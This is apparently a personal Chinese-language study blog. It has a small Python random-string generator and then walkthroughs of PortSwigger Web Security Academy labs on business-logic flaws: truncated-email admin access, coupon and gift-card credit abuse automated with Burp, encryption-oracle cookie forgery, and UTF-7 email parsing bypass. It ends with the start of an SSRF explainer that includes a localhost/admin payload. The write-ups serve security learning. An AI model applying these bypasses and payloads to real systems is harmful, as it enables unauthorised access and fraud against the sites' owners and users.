<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_strings</span>(<span class="params">count, length, use_punctuation=<span class="literal">False</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    生成指定数量和长度的随机字符串。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 定义字符集：大小写字母 + 数字</span></span><br><span class="line">    chars = string.ascii_letters + string.digits</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果需要特殊符号，取消下面注释或将参数设为 True</span></span><br><span class="line">    <span class="keyword">if</span> use_punctuation:</span><br><span class="line">        chars += string.punctuation</span><br><span class="line"></span><br><span class="line">    generated_list = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">        <span class="comment"># random.choices 在 Python 3.6+ 中可用，效率较高</span></span><br><span class="line">        rand_str = <span class="string">&#x27;&#x27;</span>.join(random.choices(chars, k=length))</span><br><span class="line">        generated_list.append(rand_str)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> generated_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--- 随机字符串生成器 ---&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 获取用户输入</span></span><br><span class="line">            count_input = <span class="built_in">input</span>(<span class="string">&quot;请输入要生成的字符串数量 (输入 q 退出): &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> count_input.lower() == <span class="string">&#x27;q&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">            count = <span class="built_in">int</span>(count_input)</span><br><span class="line">            length = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入每个字符串的长度: &quot;</span>))</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> count &lt;= <span class="number">0</span> <span class="keyword">or</span> length &lt;= <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;错误：数量和长度必须大于 0。&quot;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 询问是否包含特殊字符</span></span><br><span class="line">            special_char_input = <span class="built_in">input</span>(<span class="string">&quot;包含特殊符号吗? (y/n): &quot;</span>)</span><br><span class="line">            use_special = special_char_input.lower() == <span class="string">&#x27;y&#x27;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 生成并打印</span></span><br><span class="line">            results = generate_random_strings(count, length, use_special)</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n成功生成 <span class="subst">&#123;count&#125;</span> 个长度为 <span class="subst">&#123;length&#125;</span> 的字符串：&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span>)</span><br><span class="line">            <span class="keyword">for</span> i, s <span class="keyword">in</span> <span class="built_in">enumerate</span>(results, <span class="number">1</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>: <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">30</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;输入错误：请输入有效的整数。\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>在通过 Burp 代理流量时，打开实验室并转到“目标”&gt;“站点地图”标签页。右键点击实验室域并选择“参与工具”&gt;“发现内容”以打开内容发现工具。</p>
<p><img src="/images/image-20251121173927-36ri82w.png" alt="image"><br>2. 单击“会话未运行”以开始内容发现。短时间内，查看对话框中的“站点地图”标签页。请注意，它发现了 &#x2F;admin 路径。<br>3. 尝试浏览到 &#x2F;admin。尽管您没有访问权限，但错误消息表明 DontWannaCry 用户可以。</p>
<p><img src="/images/image-20251121174845-zu4fn8z.png" alt="image"></p>
<p><img src="/images/image-20251121174909-j8pydq2.png" alt="image"><br>4. 转到帐户注册页面。请注意，通知 DontWannaCry 员工使用其公司电子邮件地址的消息。</p>
<ol start="5">
<li>通过实验室横幅中的按钮，打开电子邮件客户端。记下您的电子邮件服务器域名中的唯一 ID（@YOUR-EMAIL-ID.web-security-academy.net）。</li>
</ol>
<p><img src="/images/image-20251121175131-29kf15w.png" alt="image"><a href="mailto:&#97;&#x74;&#x74;&#x61;&#99;&#x6b;&#101;&#x72;&#64;&#101;&#x78;&#112;&#108;&#111;&#105;&#116;&#x2d;&#48;&#x61;&#x34;&#x32;&#x30;&#48;&#x37;&#x65;&#x30;&#51;&#49;&#x37;&#97;&#53;&#102;&#56;&#x38;&#49;&#102;&#50;&#x62;&#x66;&#57;&#51;&#x30;&#49;&#x65;&#x35;&#48;&#x30;&#x62;&#102;&#x2e;&#x65;&#120;&#112;&#108;&#x6f;&#x69;&#116;&#x2d;&#x73;&#101;&#114;&#118;&#x65;&#114;&#46;&#x6e;&#101;&#x74;">&#97;&#x74;&#x74;&#x61;&#99;&#x6b;&#101;&#x72;&#64;&#101;&#x78;&#112;&#108;&#111;&#105;&#116;&#x2d;&#48;&#x61;&#x34;&#x32;&#x30;&#48;&#x37;&#x65;&#x30;&#51;&#49;&#x37;&#97;&#53;&#102;&#56;&#x38;&#49;&#102;&#50;&#x62;&#x66;&#57;&#51;&#x30;&#49;&#x65;&#x35;&#48;&#x30;&#x62;&#102;&#x2e;&#x65;&#120;&#112;&#108;&#x6f;&#x69;&#116;&#x2d;&#x73;&#101;&#114;&#118;&#x65;&#114;&#46;&#x6e;&#101;&#x74;</a></p>
<p>‍</p>
<ol start="6">
<li>返回实验室并使用以下格式的异常长的电子邮件地址进行注册：<a href="mailto:&#118;&#x65;&#114;&#x79;&#45;&#108;&#111;&#x6e;&#x67;&#x2d;&#x73;&#116;&#114;&#x69;&#x6e;&#x67;&#x40;&#89;&#79;&#85;&#82;&#45;&#x45;&#77;&#x41;&#73;&#76;&#45;&#73;&#x44;&#x2e;&#x77;&#x65;&#98;&#45;&#115;&#x65;&#99;&#x75;&#114;&#x69;&#116;&#121;&#x2d;&#97;&#x63;&#x61;&#x64;&#x65;&#x6d;&#x79;&#x2e;&#x6e;&#x65;&#116;">&#118;&#x65;&#114;&#x79;&#45;&#108;&#111;&#x6e;&#x67;&#x2d;&#x73;&#116;&#114;&#x69;&#x6e;&#x67;&#x40;&#89;&#79;&#85;&#82;&#45;&#x45;&#77;&#x41;&#73;&#76;&#45;&#73;&#x44;&#x2e;&#x77;&#x65;&#98;&#45;&#115;&#x65;&#99;&#x75;&#114;&#x69;&#116;&#121;&#x2d;&#97;&#x63;&#x61;&#x64;&#x65;&#x6d;&#x79;&#x2e;&#x6e;&#x65;&#116;</a>, very-long-string 应至少 200 个字符长。</li>
</ol>
<p><img src="/images/image-20251122114304-kv6ew3j.png" alt="image"></p>
<p><img src="/images/image-20251122114249-94xcbvd.png" alt="image"></p>
<ol>
<li>转到电子邮件客户端并注意到您已收到一封确认电子邮件。单击链接以完成注册过程。</li>
<li>登录并转到“我的帐户”页面。请注意，您的电子邮件地址已被截断为 255 个字符。</li>
<li>注销并返回到帐户注册页面。</li>
<li>使用另一个长电子邮件地址注册一个新帐户，但这次在您的电子邮件地址中包含 dontwannacry.com 作为子域，</li>
</ol>
<p>格式如下：<a href="mailto:&#x76;&#101;&#x72;&#121;&#x2d;&#x6c;&#x6f;&#x6e;&#x67;&#45;&#115;&#x74;&#x72;&#x69;&#x6e;&#x67;&#64;&#x64;&#x6f;&#110;&#x74;&#x77;&#97;&#x6e;&#x6e;&#97;&#99;&#x72;&#x79;&#x2e;&#x63;&#x6f;&#x6d;&#46;&#x59;&#x4f;&#85;&#x52;&#x2d;&#69;&#77;&#65;&#73;&#x4c;&#x2d;&#x49;&#x44;&#46;&#x77;&#x65;&#x62;&#x2d;&#x73;&#x65;&#x63;&#117;&#114;&#x69;&#x74;&#121;&#x2d;&#97;&#x63;&#x61;&#100;&#x65;&#x6d;&#121;&#46;&#x6e;&#x65;&#x74;">&#x76;&#101;&#x72;&#121;&#x2d;&#x6c;&#x6f;&#x6e;&#x67;&#45;&#115;&#x74;&#x72;&#x69;&#x6e;&#x67;&#64;&#x64;&#x6f;&#110;&#x74;&#x77;&#97;&#x6e;&#x6e;&#97;&#99;&#x72;&#x79;&#x2e;&#x63;&#x6f;&#x6d;&#46;&#x59;&#x4f;&#85;&#x52;&#x2d;&#69;&#77;&#65;&#73;&#x4c;&#x2d;&#x49;&#x44;&#46;&#x77;&#x65;&#x62;&#x2d;&#x73;&#x65;&#x63;&#117;&#114;&#x69;&#x74;&#121;&#x2d;&#97;&#x63;&#x61;&#100;&#x65;&#x6d;&#121;&#46;&#x6e;&#x65;&#x74;</a></p>
<p>确保 very-long-string 的字符数正确，以便 @dontwannacry.com 结尾的“m”恰好是第 255 个字符。<br>11. 转到电子邮件客户端并单击您收到的确认电子邮件中的链接。登录到您的新帐户并注意到您现在可以访问管理面板。确认电子邮件已成功发送到您的电子邮件客户端，但应用程序服务器将您帐户关联的地址截断为 255 个字符。因此，您已经能够使用看起来有效的 @dontwannacry.com 地址进行注册。您可以从“我的帐户”页面确认这一点。<br>12. 转到管理面板并删除 carlos 以解决实验室问题。</p>
<p>‍</p>
<p>‍</p>
<h2 id="Lab-Authentication-bypass-via-flawed-state-machine"><a href="#Lab-Authentication-bypass-via-flawed-state-machine" class="headerlink" title="Lab: Authentication bypass via flawed state machine"></a>Lab: Authentication bypass via flawed state machine</h2><p>本实验对登录过程中的事件顺序做出了有缺陷的假设。为了解决这个问题，利用这个漏洞绕过实验室的身份验证，访问管理界面，并删除用户carlos。您可以使用以下凭据登录自己的帐户：wiener:peter</p>
<p><img src="/images/image-20251122175751-x21bz7x.png" alt="image"></p>
<p><img src="/images/image-20251122175827-709i9z8.png" alt="image"></p>
<p><img src="/images/image-20251122180415-0dbvi6i.png" alt="image"></p>
<p>‍</p>
<h2 id="Lab-Infinite-money-logic-flaw"><a href="#Lab-Infinite-money-logic-flaw" class="headerlink" title="Lab: Infinite money logic flaw"></a>Lab: Infinite money logic flaw</h2><p>礼品卡是原值的，优惠码是可以每单都用的，相当于花九块钱刷十块钱</p>
<p>‍</p>
<p>‍</p>
<p>这个实验室的采购流程存在逻辑缺陷。为了解决实验室的问题，利用这个漏洞买了一件“轻量级的133t皮夹克”。您可以使用以下凭据登录自己的帐户：wiener:peter</p>
<p><img src="/images/image-20251122184234-z7xre4u.png" alt="image"></p>
<p><img src="/images/image-20251122205801-e7ob5m6.png" alt="image"></p>
<ol>
<li>在运行 Burp 的情况下，登录并注册新闻通讯以获取优惠券代码 SIGNUP30。请注意，您可以购买 10 美元的礼品卡，并从“我的账户”页面兑换。</li>
<li>将礼品卡添加到您的购物篮中，然后继续结账。应用优惠券代码以获得 30% 的折扣。完成订单并将礼品卡代码复制到剪贴板。</li>
<li>转到您的账户页面并兑换礼品卡。请注意，整个过程为您的商店积分增加了 3 美元。现在您需要尝试自动化这个过程。</li>
<li>研究代理历史记录，并注意到您通过在 POST &#x2F;gift-card 请求的 gift-card 参数中提供代码来兑换礼品卡。</li>
<li>单击顶部工具栏中的“设置”。设置对话框打开。单击会话。在“会话处理规则”面板中，单击“添加”。“会话处理规则”编辑器对话框打开。在对话框中，转到“范围”选项卡。在 URL 范围下，选择“包括所有 URL”。返回到“详细信息”选项卡。在“规则操作”下，单击“添加”&gt;“运行宏”。在“选择宏”下，再次单击“添加”以打开“宏记录器”。</li>
</ol>
<p>‍</p>
<ol start="6">
<li>选择以下请求序列：POST &#x2F;cart、POST &#x2F;cart&#x2F;coupon、POST &#x2F;cart&#x2F;checkout、GET &#x2F;cart&#x2F;order-confirmation?order-confirmed&#x3D;true、POST &#x2F;gift-card，然后点击“确定”。这样，宏编辑器就会打开。</li>
<li>在请求列表中，选择 GET &#x2F;cart&#x2F;order-confirmation?order-confirmed&#x3D;true，然后点击“配置项目”。在打开的对话框中，点击“添加”以创建自定义参数。将参数命名为 gift-card，并突出显示响应底部的礼品卡代码。两次点击“确定”返回到宏编辑器。</li>
</ol>
<p><img src="/images/image-20251122193605-v1mqwm7.png" alt="image"></p>
<p><img src="/images/image-20251122193546-x96jdv4.png" alt="image"></p>
<p><img src="/images/image-20251122205736-llzimoc.png" alt="image"></p>
<ol>
<li>选择 POST &#x2F;gift-card 请求，再次点击“配置项目”。在“参数处理”部分，使用下拉菜单指定 gift-card 参数应从先前的响应（响应 4）中派生。点击“确定”。<br>在宏编辑器中，点击“测试宏”。查看对 GET &#x2F;cart&#x2F;order-confirmation?order-confirmed&#x3D;true 的响应，并注意生成的礼品卡代码。查看 POST &#x2F;gift-card 请求。确保 gift-card 参数匹配，并确认它收到了 302 响应。一直点击“确定”直到返回到 Burp 的主窗口。</li>
<li>将 GET &#x2F;my-account 请求发送到 Burp Intruder。确保选择了“狙击手攻击”。<br>在“有效负载”侧边栏的“有效负载配置”下，选择有效负载类型“空有效负载”。选择生成 412 个有效负载。<br>单击 Resource pool 打开 Resource pool 侧边栏。将攻击添加到资源池，并将“最大并发请求”设置为 1。启动攻击。<br>攻击完成后，您将拥有足够的商店积分来购买夹克并解决实验室问题。</li>
</ol>
<p>‍</p>
<p>‍</p>
<h2 id="Lab-Authentication-bypass-via-encryption-oracle（比较有意思）"><a href="#Lab-Authentication-bypass-via-encryption-oracle（比较有意思）" class="headerlink" title="Lab: Authentication bypass via encryption oracle（比较有意思）"></a>Lab: Authentication bypass via encryption oracle（比较有意思）</h2><p>这个实验包含一个逻辑缺陷，将加密oracle暴露给用户。要解决实验室问题，可以利用此漏洞访问管理面板并删除用户carlos。您可以使用以下凭据登录自己的帐户：</p>
<p>wiener:peter</p>
<ol>
<li>启用“保持登录”选项登录，并发表一条评论。使用 Burp 的手动测试工具研究相应的请求和响应。观察到保持登录的 cookie 是加密的。</li>
<li>注意，当您尝试使用无效的电子邮件地址提交评论时，响应会在重定向您到博客文章之前设置一个加密的通知 cookie。</li>
</ol>
<p><img src="/images/image-20251122235931-gb6uf93.png" alt="image"></p>
<p><img src="/images/image-20251122235920-5z9z3f5.png" alt="image"></p>
<ol>
<li>注意，错误消息以明文形式反映了电子邮件参数中的输入：无效的电子邮件地址：your-invalid-email 推断这必须是从通知 cookie 解密的。将 POST &#x2F;post&#x2F;comment 和随后的 GET &#x2F;post?postId&#x3D;x 请求（含通知 cookie）发送到 Burp 重发器。</li>
<li>在重发器中，观察到您可以使用 POST 请求的电子邮件参数来加密任意数据，并在 Set-Cookie 标头中反映相应的密文。同样，您可以在 GET 请求中使用通知 cookie 来解密任意密文，并在错误消息中反映输出。为简单起见，双击每个请求的选项卡，并将选项卡分别重命名为加密和解密。</li>
</ol>
<p><img src="/images/image-20251123000501-ewwhmqg.png" alt="image"></p>
<ol>
<li>在解密请求中，复制您的stay-logged-in cookie并将其粘贴到通知cookie中。发送请求。响应现在包含解密的stay-logged-in cookie，例如：wiener:1598530205184，而不是错误消息。这揭示了cookie应该是username:timestamp格式。将时间戳复制到剪贴板。</li>
</ol>
<p><img src="/images/image-20251123000753-r86swpc.png" alt="image"></p>
<p><img src="/images/image-20251123000826-c742acy.png" alt="image"></p>
<p>‍</p>
<ol>
<li><p>转到加密请求，将电子邮件参数更改为管理员：your-timestamp。发送请求，然后从响应中复制新的通知cookie。</p>
</li>
<li><p>解密这个新的cookie，并观察到任何您使用电子邮件参数传递的值都会自动添加23个字符的“无效电子邮件地址：”前缀。将通知cookie发送到Burp解码器。</p>
</li>
<li><p>在解码器中，对cookie进行URL解码和Base64解码。</p>
</li>
<li><p>在Burp Repeater中，切换到消息编辑器的“Hex”标签页。选择前23个字节，然后右键选择“删除所选字节”。重新编码数据并将其复制到解密请求的通知cookie中。发送请求时，会观察到一条错误消息，指出使用了基于块的加密算法，并且输入长度必须是16的倍数。您需要使用足够的字节填充“无效电子邮件地址:”前缀，以便您将要删除的字节数是16的倍数。（cbc+base64编码不会影响字节的大小）</p>
<p><img src="/images/image-20251123001649-ynshv64.png" alt="image"></p>
</li>
<li><p>在Burp Repeater中，返回到加密请求，并在预期的cookie值开头添加9个字符，例如：xxxxxxxxx管理员:你的时间戳。加密此输入，并使用解密请求测试它是否可以成功解密。将新的密文发送到解码器，然后进行URL和Base64解码。这次，从数据开头删除32个字节。</p>
</li>
</ol>
<p><img src="/images/image-20251123002352-jocid0k.png" alt="image"></p>
<ol>
<li><p>重新编码数据并将其粘贴到解密请求的通知参数中。检查响应以确认您的输入已成功解密，最重要的是，不再包含“无效电子邮件地址:”前缀。您应该只看到管理员:你的时间戳。从代理历史记录中，将GET &#x2F;请求发送到Burp Repeater。完全删除会话cookie，用您自制的cookie的密文替换stay-logged-in cookie。发送请求。</p>
<p><img src="/images/image-20251123002559-xvki1x2.png" alt="image"></p>
</li>
<li><p>观察您现在已作为管理员登录并可以访问管理面板。使用Burp Repeater，浏览到&#x2F;admin并注意删除用户的选项。浏览到&#x2F;admin&#x2F;delete?username&#x3D;carlos以解决实验室。</p>
</li>
</ol>
<h2 id="Lab-Bypassing-access-controls-using-email-address-parsing-discrepancies（原文还不是很懂）"><a href="#Lab-Bypassing-access-controls-using-email-address-parsing-discrepancies（原文还不是很懂）" class="headerlink" title="Lab: Bypassing access controls using email address parsing discrepancies（原文还不是很懂）"></a>Lab: Bypassing access controls using email address parsing discrepancies（原文还不是很懂）</h2><p><a target="_blank" rel="noopener" href="https://portswigger.net/research/splitting-the-email-atom">https://portswigger.net/research/splitting-the-email-atom</a></p>
<p>本实验室验证电子邮件地址，以防止攻击者从未经授权的域名注册地址。在用于解析电子邮件地址的验证逻辑和库中存在解析器差异。要解决实验室的问题，利用这个漏洞注册一个帐户并删除卡洛斯。</p>
<p>要解决这个实验，您需要了解PortSwigger研究团队的Gareth Heyes在拆分电子邮件原子：利用解析器绕过访问控制白皮书中描述的技术。</p>
<h3 id="识别注册限制"><a href="#识别注册限制" class="headerlink" title="识别注册限制"></a>识别注册限制</h3><p>打开实验室并点击注册。<br>尝试使用电子邮件地址<a href="mailto:&#102;&#111;&#x6f;&#x40;&#101;&#120;&#112;&#x6c;&#111;&#105;&#116;&#45;&#x73;&#101;&#114;&#x76;&#x65;&#x72;&#x2e;&#x6e;&#101;&#116;">&#102;&#111;&#x6f;&#x40;&#101;&#120;&#112;&#x6c;&#111;&#105;&#116;&#45;&#x73;&#101;&#114;&#x76;&#x65;&#x72;&#x2e;&#x6e;&#101;&#116;</a>注册一个账户。<br>注意到应用程序阻止了请求，并显示一条错误消息，指出电子邮件域必须是ginandjuice.shop。这表明服务器在注册期间执行域检查。</p>
<h3 id="研究编码差异"><a href="#研究编码差异" class="headerlink" title="研究编码差异"></a>研究编码差异</h3><p>尝试使用以下电子邮件注册账户：</p>
<p>​<code>=?iso-8859-1?q?=61=62=63?=foo@ginandjuice.shop</code></p>
<p>这是电子邮件<a href="mailto:&#97;&#98;&#99;&#x66;&#111;&#111;&#x40;&#103;&#x69;&#x6e;&#x61;&#x6e;&#100;&#x6a;&#117;&#105;&#99;&#101;&#x2e;&#115;&#x68;&#x6f;&#112;">&#97;&#98;&#99;&#x66;&#111;&#111;&#x40;&#103;&#x69;&#x6e;&#x61;&#x6e;&#100;&#x6a;&#117;&#105;&#99;&#101;&#x2e;&#115;&#x68;&#x6f;&#112;</a>，其中abc部分使用Q编码进行编码，这是“编码字”标准的一部分。<br>请注意，注册被以下错误阻止：“出于安全原因，注册被阻止。”<br>尝试使用以下UTF-8编码的电子邮件注册账户：</p>
<p>​<code>=?utf-8?q?=61=62=63?=foo@ginandjuice.shop</code><br>请注意，注册被相同的错误消息阻止。这表明服务器正在检测并拒绝尝试使用编码字编码来操纵注册电子邮件。服务器的验证可能无法检测到不太常见的编码格式。<br>尝试使用以下UTF-7编码的电子邮件注册账户：</p>
<p>​#&#x3D;?utf-7?q?&amp;AGEAYgBj-?&#x3D;<a href="mailto:&#102;&#111;&#111;&#64;&#103;&#105;&#x6e;&#x61;&#x6e;&#100;&#106;&#x75;&#x69;&#x63;&#101;&#46;&#x73;&#104;&#111;&#112;">&#102;&#111;&#111;&#64;&#103;&#105;&#x6e;&#x61;&#x6e;&#100;&#106;&#x75;&#x69;&#x63;&#101;&#46;&#x73;&#104;&#111;&#112;</a>#<br>请注意，此尝试不会触发错误。这表明服务器没有将UTF-7编码识别为安全威胁。因为UTF-7编码似乎绕过了服务器的验证，因此您可能能够使用它来制作一个攻击，使服务器在仍然满足ginandjuice.shop域要求的同时，将确认电子邮件发送到您的攻击服务器电子邮件地址。</p>
<h3 id="Exploit-the-vulnerability-using-UTF-7"><a href="#Exploit-the-vulnerability-using-UTF-7" class="headerlink" title="Exploit the vulnerability using UTF-7"></a>Exploit the vulnerability using UTF-7</h3><p>使用以下UTF-7编码的电子邮件注册一个帐户：</p>
<p>&#x3D;&#x3D;&#x3D;?utf-7?q?attacker&amp;AEA-exploit-0a2100c2030563578019b63c0164003b.exploit-server.net&amp;ACA-?&#x3D;@ginandjuice.shop&#x3D;&#x3D;</p>
<p>这是字符串attacker@[YOUR-EXPLOIT-SERVER-ID]?&#x3D;@ginandjuice.shop，其中@符号和空格已使用UTF-7编码。<br>2. 单击“电子邮件客户端”。请注意，您已经收到了一封注册验证电子邮件。这是因为编码的电子邮件地址已经通过了验证，因为末尾有@ginandjuice.shop部分，但电子邮件服务器已经将注册电子邮件解释为attacker@[YOUR-EXPLOIT-SERVER-ID]。<br>3. 单击确认链接以激活帐户。</p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2026/01/22/Business%20logic%20vulnerabilities/" data-id="cmkottz0z0000r0vs1kol4q2c" data-title="4.Business logic vulnerabilities" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Server-side request forgery (SSRF)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2026/01/19/Server-side%20request%20forgery%20(SSRF)/" class="article-date">
  <time class="dt-published" datetime="2026-01-18T20:01:37.000Z" itemprop="datePublished">2026-01-19</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/portswigger/">portswigger</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2026/01/19/Server-side%20request%20forgery%20(SSRF)/">3.Server-side request forgery (SSRF)</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>修订时间：2026.1.19</p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient">https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface#remoteclient</a></p>
<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet">https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet</a></p>
<h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a>1.概念</h1><p>服务器端请求伪造（SSRF）是一种网络安全漏洞，攻击者可利用此漏洞使服务器端应用程序向非预期位置发起请求。在典型的SSRF攻击中，攻击者可能诱使服务器连接至组织内部基础设施中的仅限内部访问的服务。在其他情况下，攻击者可能迫使服务器连接至任意外部系统，从而导致敏感数据泄露，例如授权凭证。</p>
<h2 id="1-1-SSRF攻击会产生什么影响？"><a href="#1-1-SSRF攻击会产生什么影响？" class="headerlink" title="1.1 SSRF攻击会产生什么影响？"></a>1.1 SSRF攻击会产生什么影响？</h2><p>成功的SSRF攻击通常会导致组织内部发生未经授权的操作或数据访问。这种攻击可能发生在存在漏洞的应用程序中，也可能发生在该应用程序可通信的其他后端系统上。在某些情况下，SSRF漏洞可能允许攻击者执行任意命令。若SSRF漏洞利用导致连接外部第三方系统，可能引发恶意后续攻击，且攻击源头看似来自托管漏洞应用的组织。</p>
<h2 id="1-2-常见SSRF攻击方式"><a href="#1-2-常见SSRF攻击方式" class="headerlink" title="1.2 常见SSRF攻击方式"></a>1.2 常见SSRF攻击方式</h2><p>SSRF攻击常利用信任关系，从漏洞应用发起攻击并执行未授权操作。此类信任关系可能存在于服务器之间，或同一组织内的其他后端系统之间。</p>
<h3 id="1-2-1-针对服务器的SSRF攻击"><a href="#1-2-1-针对服务器的SSRF攻击" class="headerlink" title="1.2.1 针对服务器的SSRF攻击"></a>1.2.1 针对服务器的SSRF攻击</h3><p> 在针对服务器的SSRF攻击中，攻击者诱使应用程序通过其回环网络接口向托管该应用的服务器发起HTTP请求。这通常涉及提供包含127.0.0.1（指向回环适配器的保留IP地址）或localhost（该适配器的常用名称）等主机名的URL。例如，假设某购物应用允许用户查询商品在特定门店的库存状态。为提供库存信息，该应用需调用多个后端REST API。其实现方式是通过前端HTTP请求将URL传递至相关后端API接口。当用户查询商品库存时，其浏览器将发起如下请求：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1</span><br></pre></td></tr></table></figure>

<p>这将促使服务器向指定URL发起请求，获取库存状态并返回给用户。在此示例中，攻击者可修改请求指向服务器本地URL：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /product/stock HTTP/1.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 118</span><br><span class="line"></span><br><span class="line">stockApi=http://localhost/admin</span><br></pre></td></tr></table></figure>

<p>服务器将获取&#x2F;admin URL的内容并返回给用户。攻击者虽可访问&#x2F;admin网址，但管理功能通常仅限认证用户使用。这意味着攻击者无法获取有价值的信息。然而，若对&#x2F;admin网址的请求来自本地机器，常规访问控制将被绕过。由于请求看似来自可信位置，应用程序会授予管理功能的完全访问权限。</p>
<p>为什么应用程序会这样行为，并默认信任来自本地机器的请求？这可能由多种原因导致：</p>
<p>• 访问控制检查可能由位于应用服务器前端的其他组件实现。当连接回服务器时，该检查会被绕过。</p>
<p>• 为灾难恢复目的，应用程序可能允许来自本地机器的任何用户无需登录即可进行管理访问。这为管理员在遗失凭证时提供了系统恢复途径，其前提是仅完全可信用户会直接访问服务器端。</p>
<p>• 管理界面可能监听与主应用程序不同的端口号，用户无法直接访问。</p>
<p>此类信任关系——即本地机器发起的请求与普通请求获得不同处理——往往使SSRF成为关键漏洞。</p>
